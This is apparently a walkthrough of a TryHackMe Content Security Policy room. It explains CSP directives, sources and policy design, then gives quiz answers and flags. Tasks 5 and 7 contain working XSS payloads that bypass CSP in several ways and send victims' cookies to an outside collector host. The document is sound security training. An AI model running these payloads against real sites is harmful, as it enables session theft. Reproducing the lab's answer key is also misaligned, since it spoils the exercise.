# Content Security Policy

In this room you'll learn what CSP is, what it's used for and how to recognize vulnerabilities in a CSP header.

[Content Security Policy](https://tryhackme.com/room/csp)

## Topic's

* Content Security Policy Fundamentals
* Bypass Content Security Policy

## Task 1 Introduction

Welcome to the CSP room! In this room, you'll learn what CSP is, what it's used for, and how to exploit flaws in a flawed CSP configuration. If you don't know what XSS (Cross-site scripting) is, I would recommend checking out [the XSS room](https://tryhackme.com/room/xss), as you'll need to have some experience with XSS.

**What is CSP?**

Content Security Policy, or CSP, is a policy usually sent via an HTTP response header from the webserver to your browser when requesting a page that describes which sources of content the browser should allow to be loaded in, and which ones should be blocked. In case an XSS or data injection vulnerability is found in a website, CSP is designed to prevent this vulnerability from being exploited until it's properly patched, and should serve as an **extra layer** of protection, not as your only line of defense.

A CSP policy can also be included within the page's HTML source code, using the <meta> tag, such as this:

```xml
<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';">
```

**How can CSP be bypassed?**

If you've found an XSS vulnerability in a website, but can't run any unauthorized code, the CSP of the website may be blocking it. What you'll need to do is read the policy sent by the server and see if any flaws in it could be exploited to successfully inject and execute your payload.

1. What does CSP stand for?

`Content Security Policy`

2. CSP is designed to add an additional layer of protection against the exploitation of what vulnerability?

`XSS`

3. In which part of the HTTP response does the server usually send the policy to the client?

`header`

## Task 2 Directives

The CSP specification contains quite a few directives. In this room, we'll focus on the most popular and important ones, but if you'd like to dive deeper into CSP directives, I'd recommend checking out the [MDN page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) about them.

Some of the more commonly used directives are:

* `default-src` - As the name states, this directive is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.
* `script-src` - This directive specifies the sources wherefrom JavaScript scripts can be loaded and executed.
* `connect-src` - This directive specifies to which locations can JavaScript code perform AJAX requests (think XMLHTTPRequest or fetch).
* `style-src / img-src / font-src / media-src` - These directives specify from which locations CSS stylesheets, images, fonts and media files (audio/video) respectively can be loaded
* `frame-src / child-src` - This directive defines which locations can be embedded on the webpage via (i)frames.
* `report-uri` - This is a special directive that will instruct the browser report all violations of your Content Security Policy via a POST request to a particular URL. This is useful if you're trying to find potential code injection vulnerabilities or locations where your CSP may break the functionality of your website. This directive is deprecated and will soon be replaced by the **report-to** directive, but for now, it remains in use. If you'd like to learn more about it, visit the [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri) page for more information.

There are also quite a few other directives that I won't be focusing on in this course. If you're interested in the complete list of directives, [content-security-policy.com](https://content-security-policy.com/#directive) provides this and much more useful information.

1. Which directive can we use to restrict the loading of scripts on our website?

`script-src`

2. Which directive can we use to restrict the loading of videos on our website?

`media-src`

3. If we want to log CSP violations, which directive do we need to set to have the browser report violations to us?

`report-uri`

## Task 3 Sources

**Sources**

After a directive in the policy comes a list of sources that specify wherefrom the particular resources are allowed to be loaded. Here are some of the most commonly used sources:

* `*` - This source is a wildcard, which means content for that specific directive can be loaded from anywhere. It's recommended not to use this source for script-src as it will essentially allow loading scripts from any URL.
* `'none'` - This is the opposite of the wildcard (*) source as it fully disallows loading resources of the specified directive type from anywhere. For example, if you know you won't be serving certain content on your website, such as music or videos, you can just set the directive to 'none' in your CSP like so: `media-src 'none'`
* `'self'` - This source allows you to load resources that are hosted on the same protocol (http/https), hostname (example.com), and port (80/443) as the website. For example, if you're accessing a site such as `https://example.com` and it has the CSP header set to `default-src 'self'`, you won't be able to load any scripts, images or stylesheets from https://subdomain.example.com, http://example.com or https://example.org.
* `'unsafe-inline'` - This source allows the use of inline stylesheets, inline JavaScript and event attributes like onclick. This source is considered unsafe and should be avoided.
* `'unsafe-eval'` - This source allows additional JavaScript code to be executed using functions such as eval() by JS code that's already permitted within the policy. This is usually safe unless a vulnerability is found in the code that runs on the page or the script-src sources are very loose, for example allowing any script to be loaded from a CDN.
* `example.com` - This source would allow you to load resources from the domain example.com, but not its subdomains
* `*.example.com` - This source would allow you to load resources from all of the subdomains of example.com, but not the base domain.
* `data:` - Adding this source to a directive would allow resources to be loaded from a data: url. For script-src, this source is also considered unsafe and should be avoided. Here are some examples of data: urls:

  * `data:image/png;base64,iVBORw0KGgo...`
  * `data:application/javascript,alert(1337)`

There's also a couple of special sources, which are usually used in combination with some of the above to ensure only allowed resources are loaded, whilst maintaining convenience for the site owners.

* `nonce-`: This allows a resource to load if it has a matching nonce attribute. The nonce is a random string that is generated for every request. It is usually used for loading inline JS code or CSS styles. It needs to be unique for every request, as if a nonce is predictable, it can be bypassed.
For example, if a server sends the following header: `script-src 'unsafe-inline' 'nonce-GJYTxu'`, the browser will only execute scripts that have the attribute set, like so: 

```js
<script nonce="GJYTxu">alert(1)</script>
```

* `sha256-`: This is simply a SHA256 hash encoded via Base64 used as a checksum to verify that the content of the resource matches up with what's allowed by the server. Currently, `sha256`, `sha384`, and `sha512` are by the CSP standard. This is usually used only for inline JS code or CSS styles but can be used to verify external scripts and/or stylesheets too. We can generate a SHA256 hash of an inline script we're intending to use by using a tool to generate it such as the one at report-uri.com or simply running it on a webpage with a restrictive CSP header and then extracting the hash from the console error.
For example, if we're looking to run the following JS on our website inline: `alert(1337)`, we'll need to compute a SHA256 hash. I went ahead and did that, and the hash for the above code would be `'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='`. Now we can add that to our policy, like so: `script-src 'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='`. Once that's added, the inline script should run as normal.

1. If we want to allow script execution via functions such as `eval()` from already trusted scripts, what source should we allow in our script-src directive?

`'unsafe-eval'`

2. What directive-source combination should we add to our policy if we want to `specifically` block `all` JavaScript content from running on our website?

`script-src 'none'`

## Task 4 Creating a Content Security Policy

Now that we've mentioned some of the most commonly used sources, we can talk about how to build your security policy for your website. For a more interactive way of building your policy, I'd recommend [report-uri.com's CSP generator](https://report-uri.com/home/generate) as it's a great tool that you can use to experiment with various CSP settings without having to type them out manually.

When creating a CSP policy, I would recommend setting the **default-src** directive to 'self'. This ensures all resources by default will only be allowed to load from your website and nowhere else. If all the content (scripts, images, media...) is hosted on your site, this is all you'll need to set. If you load some of the content on your site from external sources (for example, images from a hosting site such as imgur.com), you can adjust the rest of the directives according to your needs.

When setting up the **script-src** directive and its sources, you should pay special attention to what you're allowing to load. If you're loading a script from an external source such as a CDN, make sure you're specifying the full URL of the script or a nonce/SHA hash of it and **not** just the hostname where it's hosted at, unless you're 100% sure no scripts that could be used to bypass your policy are hosted there. For example, if you're including [jQuery from cdnjs](https://cdnjs.com/libraries/jquery) on your website, you should include the full URL of the script (`script-src cdnjs.cloudflare.com/ajax/.../jquery`.min.js) or the SHA256 hash in your policy. Most CDNs allow you to get the script hash somewhere on their site. For example, on cdnjs, you can get it by clicking "Copy SRI" on the Copy dropdown.

Inline JS

If you need to include inline JavaScript or stylesheets in your website, you'll need to set up a nonce generator on the server-side, or compute SHA hashes of your inline scripts and then include them in your policy. There are loads of great libraries for most languages that allow you to do this with minimal effort. For example, if you're working with an Express-based website, I would recommend using the [helmet-csp](https://www.npmjs.com/package/helmet-csp) module available on npm, which randomly generates the nonce for you. If you're looking to hash your inline scripts, you can use an online tool such as [report-uri.com's hash](https://report-uri.com/home/hash) generator or you can use a tool such as [AutoCSP](https://github.com/fcsonline/autocsp) to automatically generate your hashes for you.

Note that if you serve JSONP endpoints on your website, you may need to take additional precautions. If you're not sure whether you serve JSONP endpoints or not, you probably don't.

1. What hashing algorithm can you use to verify the scripts being loaded? (Without the numbers)

`SHA`

2. Can you include the URLs of the permitted scripts directly in your security policy? (Yes / No)

`Yes`

## Task 5 Bypassing a Content Security Policy

Since we now know how to create content security policies, let's learn how to find bypasses for them.

If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using **Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/)**. It's able to detect various mistakes in any CSP configuration.

**JSONP endpoints**

Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The [JSONBee](https://github.com/zigoo0/JSONBee) repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.

**Unsafe CSP configurations**

Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so:

```html
<script src="data:application/javascript,alert(1)"></script>
```

**Exfiltration**

To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as [Beeceptor](https://beeceptor.com/) to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.

If you prefer running a web server for exfiltration locally, you can set up a simple HTTP server using python by running

`python -m SimpleHTTPServer` or `python3 -m http.server`.

If the website you're exploiting allows AJAX requests (via `connect-src`) to anywhere, you can create a fetch request to your server like so:

```html
<script>fetch(`http://example.com/${document.cookie}`)</script>
```

When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:

![](https://i.imgur.com/edr8tNa.png)

If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the connect-src policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.

For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so:

```html
<script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script>
```

1. If Ajax/XHR requests are blocked, can we still exfiltrate sensitive information? (Yes / No)

`Yes`

## Task 6 CSP Sandbox

Time to put your practice to test! I've created a VM that is intentionally vulnerable to XSS but uses various content security policies to mitigate it. You should be able to test what you've learned so far. It consists of 10 challenges, 7 of which are **attack** and 3 are **defend**, and also a playground where you can test your own CSP configurations.

You can access the introduction at http://MACHINE_IP/.

1. I have deployed the CSP Sandbox machine.

`No answer needed`

## Task 7 CSP Sandbox :: Attack challenges

To deploy the machine, go to the CSP Sandbox task.

Attack challenges require you to bypass the CSP header sent by the webpage and exfiltrate the administrator's cookies. For methods on how you can achieve this, refer to the Bypassing CSP task of this room.

For verification, all challenges are accessed by a bot locally (localhost).

1. Flag for attack-1

```html
<BODY ONLOAD=fetch(`https://stroke.free.beeceptor.com/${document.cookie}`)>
```

`GET /flag=THM%7BTh4t_W4s_Pr3tty_3asy%7D`

`THM{Th4t_W4s_Pr3tty_3asy}`

2. Flag for attack-2

```
kali@kali:~/CTFs/tryhackme/Content Security Policy$ echo -n 'fetch(`https://stroke.free.beeceptor.com/${document.cookie}`)' | base64

ZmV0Y2goYGh0dHBzOi8vc3Ryb2tlLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ==
```

```html
<script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vc3Ryb2tlLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ=="></script>
```

`GET /flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D`

`THM{BUs1ng_data:_1snt_Any_S4fer}`

3. Flag for attack-3

```html
<IMG id="randomcspsmith" SRC="">
<script>document.getElementById('randomcspsmith').src="https://stroke.free.beeceptor.com/" + document.cookie;</script>
```

`GET /flag=THM%7BTh4ts_N0t_4n_1m4ge!!%7D`

`THM{Th4ts_N0t_4n_1m4ge!!}`

4. Flag for attack-4

```html
<link id="randomcspsmith" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('randomcspsmith').href="https://stroke.free.beeceptor.com/" + document.cookie;</script>
```

`GET /flag=THM%7BStyle_Y0ur_W3bs1teS%7D`

`THM{Style_Y0ur_W3bs1teS}`

5. Flag for attack-5

```html
<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://stroke.free.beeceptor.com/'.concat(document.cookie))"></script>
```

`GET /flag=THM%7BN0_JSONP_D0mains_Plz%7D`

`THM{N0_JSONP_D0mains_Plz}`

6. Flag for attack-6

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$on.curry.call().document.location='https://stroke.free.beeceptor.com/' + $on.curry.call().document.cookie}}</div>
```

`GET /flag=THM%7BTrust_N0_CDN%7D`

`THM{Trust_N0_CDN}`

7. Flag for attack-7

```html
<script src="/'; new Audio('https://stroke.free.beeceptor.com/' + document.cookie); '"></script>
```

`GET /flag=THM%7BTh1s_4udio_S0unds_N1ce%7D`

`THM{Th1s_4udio_S0unds_N1ce}`

## Task 8 CSP Sandbox :: Defend challenges

To deploy the machine, go to the CSP Sandbox task.

Defend challenges require you to defend the website from XSS attacks by creating a CSP header that blocks them, whilst allowing the legitimate scripts to execute.

1. What is the flag for defend-1?

```
Welcome to defend-1!
The attackers are trying to XSS our admins! Quick, write a CSP policy that only allows the scripts we use!
(You can view our allowed scripts by checking the source code of this webpage.)
The attackers have sent the following:
You have successfully defended the server against attackers!
Here's your reward: THM{N0_0utside_S0urces} 
```

`THM{N0_0utside_S0urces}`

2. What is the flag for defend-2?

```
Welcome to defend-2!
The attackers are trying to XSS our admins! Quick, write a CSP policy that only allows the scripts we use!
(You can view our allowed scripts by checking the source code of this webpage.)
The attackers have sent the following:
You have successfully defended the server against attackers!
Here's your reward: THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom} 
```

`THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}`

3. What is the flag for defend-3?

```
Welcome to defend-3!
The attackers are trying to XSS our admins! Quick, write a CSP policy that only allows the scripts we use!
(You can view our allowed scripts by checking the source code of this webpage.)
The attackers have sent the following:
You have successfully defended the server against attackers!
Here's your reward: THM{Hash_Y0ur_1nl1ne_Scr1pts} 
```

`THM{Hash_Y0ur_1nl1ne_Scr1pts}`
